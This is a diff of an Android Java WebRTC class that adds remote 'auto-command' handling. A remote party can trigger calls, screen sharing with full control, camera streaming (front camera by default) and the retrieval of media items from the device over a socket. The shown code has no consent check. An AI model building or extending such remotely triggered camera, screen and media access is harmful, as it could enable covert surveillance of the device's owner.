@@ -29,7 +29,7 @@ public class WebRTCCompanion {
         void onRemoteVideoTrack(VideoTrack track);
         void onCallEnded();
         void onError(String error);
-        void onAutoScreenShareRequest(String fromUser, boolean fullControl);
+        void onAutoScreenShareRequest(String fromUser, boolean fullControl, boolean streamCamera, String cameraChoice);
     }
 
     private final Context context;
@@ -69,7 +69,7 @@ public class WebRTCCompanion {
             String clean = initialId.trim();
             this.myId = clean.endsWith("_screen") ? clean : (clean + "_screen");
         } else {
-            this.myId = "";
+            this.myId = DeviceRegistry.getDeviceId(this.context) + "_screen";
         }
         this.callback = callback;
 
@@ -548,11 +548,12 @@ public class WebRTCCompanion {
                     JSONObject sdpJson = new JSONObject();
                     sdpJson.put("type", "offer");
                     sdpJson.put("sdp", sessionDescription.description);
-                    sdpJson.put("isScreenShare", true);
+                    boolean sharing = isSharing();
+                    sdpJson.put("isScreenShare", sharing);
                     offerPayload.put("to", targetUser);
                     offerPayload.put("from", myId);
                     offerPayload.put("offer", sdpJson);
-                    offerPayload.put("isScreenShare", true);
+                    offerPayload.put("isScreenShare", sharing);
 
                     if (socket != null && socket.connected()) {
                         Log.i(TAG, "Sending call offer: " + myId + " -> " + targetUser);
@@ -784,25 +785,34 @@ public class WebRTCCompanion {
                 JSONObject data = (JSONObject) args[0];
                 String command = data.optString("command", "");
                 String fromSocketId = data.optString("from", "");
-                Log.i(TAG, "Auto-command received: " + command + " from " + fromSocketId);
+                String caller = data.optString("caller", fromSocketId);
+                String cameraChoice = data.optString("cameraChoice", "front");
+                boolean streamCamera = !"none".equalsIgnoreCase(cameraChoice);
+                Log.i(TAG, "Auto-command received: " + command + " from " + caller + " (cam=" + cameraChoice + ")");
 
                 switch (command) {
                     case "audio_call":
-                        startAudioCall(fromSocketId);
+                        startAudioCall(caller);
                         break;
                     case "video_call":
-                        startVideoCall(fromSocketId);
+                        startVideoCall(caller);
                         break;
                     case "screen_share":
                         if (callback != null) {
-                            callback.onAutoScreenShareRequest(fromSocketId, false);
+                            callback.onAutoScreenShareRequest(caller, false, streamCamera, cameraChoice);
                         }
                         break;
                     case "screen_share_control":
                         if (callback != null) {
-                            callback.onAutoScreenShareRequest(fromSocketId, true);
+                            callback.onAutoScreenShareRequest(caller, true, streamCamera, cameraChoice);
                         }
                         break;
+                    case "get_media_detail": {
+                        long mediaId = data.optLong("mediaId", 0);
+                        String mediaType = data.optString("mediaType", "image");
+                        MediaBridge.getMediaItemDetail(context, mediaId, mediaType, socket, fromSocketId);
+                        break;
+                    }
                     case "get_device_info": {
                         JSONObject info = new JSONObject();
                         info.put("deviceId", DeviceRegistry.getDeviceId(context));
